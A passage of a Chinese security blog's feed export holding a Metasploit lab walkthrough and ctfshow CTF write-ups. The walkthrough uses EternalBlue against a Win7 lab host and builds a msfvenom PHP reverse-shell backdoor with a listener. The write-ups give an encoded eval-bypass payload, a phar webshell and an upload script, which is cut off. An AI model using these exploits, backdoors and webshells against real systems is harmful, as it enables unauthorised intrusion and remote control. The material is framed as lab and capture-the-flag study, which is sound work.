src="../images/image-20230309215259140.png" alt="image-20230309215259140"></p><p><strong>5.漏洞利用</strong></p><p>那么我们就可以进行漏洞利用了，就是使用expolit</p><p><img src="../images/image-20230309215405622.png" alt="image-20230309215405622"></p><p>win7需要使用exploit/windows/smb/ms17_010_eternalblue</p><p>windows2003使用exploit/windows/smb/ms17_010_psexec</p><p>所以我直接<strong>use exploit/windows/smb/ms17_010_eternalblue</strong></p><p><img src="../images/image-20230309215644933.png" alt="image-20230309215644933"></p><p><img src="../images/image-20230309215658099.png" alt="image-20230309215658099"></p><p>设置完成后，我们就可以开始run了</p><p><strong>6.开始run</strong></p><p><img src="../images/image-20230309215807989.png" alt="image-20230309215807989"></p><p>成功了，拿到<strong>meterpreter</strong>的话就是成功拿下目标机器了</p><p><img src="../images/image-20230309215904446.png" alt="image-20230309215904446"></p><p>我们可以输入？来查看其他命令，然后利用这些命令来进行命令执行。</p><p>输入shell的话就是可以拿到目标机器的cmd了</p><p><img src="../images/image-20230309220109374.png" alt="image-20230309220109374"></p><p>想对目标机器干啥就直接去看？给出的指令了。</p><p>对win7输入netstat -an指令的话，就可以看到本地的64392端口被192.168.3.110：4444监听，反弹shell成功</p><p><img src="../images/image-20230309220254984.png" alt="image-20230309220254984"></p><p>至此  永恒之蓝漏洞就复现成功了，那么我们对msf也有一点了解了。</p><p>nmap -sn -PE -n 172.22.81.1/24 -oX out.xml    —&gt;   这就是扫c段的</p><p>  -sn 不扫描端口            -PE <a href="https://so.csdn.net/so/search?q=ICMP&amp;spm=1001.2101.3001.7020">ICMP</a>扫描</p><p>   -n不进行<a href="https://so.csdn.net/so/search?q=dns解析&amp;spm=1001.2101.3001.7020">dns解析</a>           -oX 输出结果</p><h3 id="利用Msfvenom写入后门"><a href="#利用Msfvenom写入后门" class="headerlink" title="利用Msfvenom写入后门"></a>利用Msfvenom写入后门</h3><p>msfvenom a Metasploit standalone payload generator，Also a replacement for msfpayload and msfencode.是用来生成后门的软件。<br>MSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-l, --<span class="keyword">list</span> &lt;type&gt; 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all</span><br><span class="line"> </span><br><span class="line">-p, --payload &lt; payload&gt; 指定需要使用的<span class="title function_ invoke__">payload</span>(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的</span><br><span class="line"> </span><br><span class="line">-f, --format &lt; format&gt; 指定输出格式</span><br><span class="line"> </span><br><span class="line">-e, --encoder &lt;encoder&gt; 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload</span><br><span class="line"> </span><br><span class="line">-a, --arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64</span><br><span class="line"> </span><br><span class="line">-o, --out &lt; path&gt; 指定创建好的payload的存放位置</span><br><span class="line"> </span><br><span class="line">-b, --bad-chars &lt; <span class="keyword">list</span>&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 <span class="string">&#x27;\x0f&#x27;</span>、<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"> </span><br><span class="line">-n, --nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line"> </span><br><span class="line">-s, --space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小</span><br><span class="line"> </span><br><span class="line">-i, --iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line"> </span><br><span class="line">-c, --add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line"> </span><br><span class="line">-x, --template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中</span><br><span class="line"> </span><br><span class="line">-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line"> </span><br><span class="line">-v, --<span class="keyword">var</span>-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式</span><br><span class="line"> </span><br><span class="line">-t, --timeout &lt;second&gt; 从stdin读取有效负载时等待的秒数（默认为<span class="number">30</span>，<span class="number">0</span>表示禁用）</span><br><span class="line"> </span><br><span class="line">-h,--help 查看帮助选项</span><br><span class="line"> </span><br><span class="line">--platform &lt; platform&gt; 指定payload的目标平台</span><br></pre></td></tr></table></figure><p>这里的话这些命令的话不用记得，多用几次命令就熟悉了</p><p>这里的话先查看一下哪些后门工具可以进行利用</p><p><code>msfvenom -l payload | grep &#39;windows&#39; | awk &#39;&#123;print $1&#125;&#39;</code></p><p>grep —&gt;  是linux中的文本匹配语句  这里就是输出有windows的payload</p><p>awk  —&gt;是文本打印工具  <a href="https://www.cnblogs.com/ggjucheng/archive/2013/01/13/2858470.html">awk</a></p><p><img src="../images/image-20230310161327640.png" alt="image-20230310161327640"></p><p>就会出现一堆payload，那么我们就可以从中选一个进行利用</p><p>这里我们选一个php的payload，这里的话因为是靶机的话，然后没有一些编程语言环境的话，payload到那边是执行不了的(我们在靶机上就得构建一个phpstudy来执行这个生成的后门代码)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp lhost=<span class="number">172.29</span>.<span class="number">76.20</span> lport=<span class="number">5555</span> -f raw &gt;a.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230310162542496.png" alt="image-20230310162542496"></p><p>成功生成了php的代码，那么我们就把生成的php代码复制到靶机上</p><p>这里话得在win7靶机上安装phpstudy和<a href="https://segmentfault.com/a/1190000040641247">补丁</a>  补丁是为了成功安装vmtools</p><p>好把a.php拖进去(拖到www目录下)</p><p><img src="../images/image-20230310170804761.png" alt="image-20230310170804761"></p><p>成功托进去</p><p>在执行a.php文件之前  我们得在kali攻击机上开启监听</p><p><img src="../images/image-20230310171148353.png" alt="image-20230310171148353"></p><p>使用监听模块进行监听</p><p><code>use exploit/multi/handler</code></p><p><code>set payload php/meterpreter_reverse_tcp</code></p><p>因为我们是使用php/meterpreter_reverse_tcp写的后门，那么我们监听的话还是得用它</p><p>这里的<code>reverse_tcp</code>和<code>reverse_http</code>的区别是，tcp能指定任意端口，http只能指定80端口</p><p><img src="../images/image-20230310171433064.png" alt="image-20230310171433064"></p><p><img src="../images/image-20230310171801516.png" alt="image-20230310171801516"></p><p><img src="../images/image-20230310171816219.png" alt="image-20230310171816219"></p><p>在靶机上访问a.php的时候，kali监听就拿到了meterpreter了。</p><p>上面我们使用的php是属于web的payload,那么我们也可以使用脚本payload来进行拿meterpreter</p><p>这篇文章进行了很好的补充  —-&gt;   <a href="https://blog.csdn.net/qq_48985780/article/details/121441548">文章</a></p><p>上面是传的php代码，接下来我们来传exe文件</p><p>利用msf攻击windows  就是留下后门</p><p>这里的利用webshell的意思是当靶机存在命令执行或者远程漏洞执行漏洞时，我们可以进行利用，从而拿下靶机的控制权</p><p>这里利用的是web_delivery</p><p><img src="../images/image-20230310180232793.png" alt="image-20230310180232793"></p><p><img src="../images/image-20230310180529065.png" alt="image-20230310180529065"></p><p>这里使用的是php反弹shell脚本 </p><p>和上面生成的a.php是一个意思</p><p>这里生成了一个php代码  然后我们复制之后拿去ping  当然是不能成功的，因为就是靶机没有php的环境变量，所以不能执行php代码</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透入门1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-常用姿势 刷题记录</title>
      <link href="/posts/66e9d03e.html"/>
      <url>/posts/66e9d03e.html</url>
      
        <content type="html"><![CDATA[<p>这里包括多种类型的题目  为常见的姿势  用于积累自己的方法库</p><h2 id="web801-flask算pin"><a href="#web801-flask算pin" class="headerlink" title="web801(flask算pin)"></a>web801(flask算pin)</h2><p>题目</p><p><img src="../images/image-20230303200038182.png" alt="image-20230303200038182"></p><p><strong>条件: flask debug模式开启 存在任意文件读取</strong></p><p>这里的话是python版本的不同，那么计算pin码的脚本也是不相同的，原因就在于加密方式不相同。</p><p>python3.6是MD5加密，python3.8是sha1加密</p><p><a href="https://blog.csdn.net/weixin_54648419/article/details/123632203">详细的wp </a>这篇文章写的非常详细了，我这里就不写了。</p><h2 id="web802-无字母数字命令执行"><a href="#web802-无字母数字命令执行" class="headerlink" title="web802( 无字母数字命令执行)"></a>web802( <strong>无字母数字命令执行</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里话网上有很多种方法来进行这个绕过，这里就不多赘述了</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">5</span>B%<span class="number">5</span>D%<span class="number">2</span>E%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">27</span>%<span class="number">27</span>%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">24</span>%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">27</span>%<span class="number">5</span>F%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">2</span>E%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">3</span>D%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">3</span>B%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>%<span class="number">24</span>%<span class="number">5</span>F%<span class="number">5</span>B%<span class="number">5</span>F%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B&amp;__=system&amp;_=cat flag.php</span><br></pre></td></tr></table></figure><p><strong>这里的payload是从rce极限挑战里面拿出来的  一般情况下，rce极限挑战里的payload都可以通杀大部分题目</strong></p><h2 id="web803-phar文件包含"><a href="#web803-phar文件包含" class="headerlink" title="web803( phar文件包含)"></a>web803( <strong>phar文件包含</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题的思路：过滤了php和data，不能利用这几个协议，在文件包含中，还可以使用<strong>zip协议和phar协议(</strong>远程文件包含这个不行)</p><p><strong>file</strong>协议直接读文件，但是有个file_exists需要存在一个txt文件</p><p>而且测试了一下，只能往<strong>/tmp</strong>中去写入文件，网站目录<strong>/var/www/html</strong>写不进去的</p><p>日志包含也还是收到<strong>txt</strong>后缀的影响</p><p>所以整体的思路，先利用<strong>file_put_contents</strong>讲执行命令的语句写入到文件中，然后再通过<strong>include</strong>包含</p><p>(就是进行两次发包，第一次先把利用file_put_contents把内容写入tmp下的phar内，第二次在进行发包，进行include包含，然后进行命令执行)</p><p><strong>phar协议</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成这个phar包得先修改一下php.ini的设置</p><p><img src="../images/image-20230305155029273.png" alt="image-20230305155029273"></p><p>原本这里是On的，把他修改成Off就行</p><p>然后在重启phpstudy就行了</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://2ed54b8f-1578-49c9-8386-ce7c9c6f68c6.challenge.ctf.show/&quot;</span></span><br><span class="line">data1=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;/tmp/shell.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;phar:///tmp/shell.phar/a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span 